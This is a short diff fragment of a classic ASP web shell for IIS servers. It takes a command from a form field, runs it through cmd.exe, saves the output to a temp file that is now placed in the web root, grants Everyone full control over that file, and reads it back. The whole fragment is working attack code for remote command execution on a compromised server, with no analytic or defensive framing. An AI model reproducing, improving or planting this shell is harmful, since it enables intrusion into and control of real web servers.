@@ -12,14 +12,13 @@ Set oSNet = Server.CreateObject("WSCRIPT.NETWORK")
 Set oFSys = Server.CreateObject("Scripting.FileSystemObject")
 szCMD = Request.Form("C")
 If (szCMD <> "") Then
-  szTF = "c:\windows\pchealth\ERRORREP\QHEADLES\" &  oFSys.GetTempName()
+  szTF = "C:\inetpub\wwwroot\" & oFSys.GetTempName()
+
   ' Here we do the command
-  Call oS.Run("win.com cmd.exe /c """ & szCMD & " > " & szTF &
-"""",0,True)
+  Call oS.Run("win.com cmd.exe /c """ & szCMD & " > " & szTF & """",0,True)
   response.write szTF
   ' Change perms
-  Call oS.Run("win.com cmd.exe /c cacls.exe " & szTF & " /E /G
-everyone:F",0,True)
+  Call oS.Run("win.com cmd.exe /c cacls.exe " & szTF & " /E /G everyone:F",0,True)
   Set oF = oFSys.OpenTextFile(szTF,1,False,0)
 End If 
 %>
